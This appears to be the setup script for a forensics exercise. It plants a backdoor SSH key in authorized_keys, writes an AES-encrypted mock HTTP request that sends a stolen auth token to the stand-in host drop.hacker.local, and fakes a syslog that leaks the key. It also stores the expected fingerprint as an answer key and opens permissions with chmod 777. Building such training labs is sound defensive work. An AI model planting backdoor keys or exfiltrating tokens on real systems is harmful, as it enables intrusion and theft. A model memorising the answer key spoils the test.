apt-get update && apt-get install -y python3 python3-pip openssh-client openssl gawk
    pip3 install pytest

    mkdir -p /home/user/forensics

    ssh-keygen -t ed25519 -C "admin@local" -f /tmp/good_key -N ""
    ssh-keygen -t rsa -b 2048 -C "backdoor@hacker.local" -f /tmp/bad_key -N ""
    cat /tmp/good_key.pub > /home/user/forensics/authorized_keys
    cat /tmp/bad_key.pub >> /home/user/forensics/authorized_keys

    ssh-keygen -lf /tmp/bad_key.pub | gawk '{print $2}' > /tmp/expected_fingerprint

    cat << 'EOF' > /tmp/http_payload.txt
POST /upload HTTP/1.1
Host: drop.hacker.local
User-Agent: curl/7.68.0
X-Stolen-Auth-Token: secr3t_t0k3n_88192a_xyz
Accept: */*
EOF

    KEY="a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
    IV="0102030405060708090a0b0c0d0e0f10"

    openssl enc -aes-256-cbc -K $KEY -iv $IV -in /tmp/http_payload.txt -out /home/user/forensics/exfiltrated_data.enc

    cat << 'EOF' > /home/user/forensics/syslog_dump.txt
May 10 12:00:01 server systemd[1]: Started cron.
May 10 12:05:22 server sshd[10222]: Accepted publickey for user from 192.168.1.10
May 10 12:15:00 server exfiltrator[13337]: Initialization complete.
May 10 12:15:01 server exfiltrator[13337]: DEBUG - Using AES-256-CBC. Key: a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90 IV: 0102030405060708090a0b0c0d0e0f10
May 10 12:15:05 server exfiltrator[13337]: Payload dispatched.
May 10 12:20:01 server CRON[13400]: (root) CMD ( /usr/lib/sysstat/sa1 1 1)
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod 777 /tmp/expected_fingerprint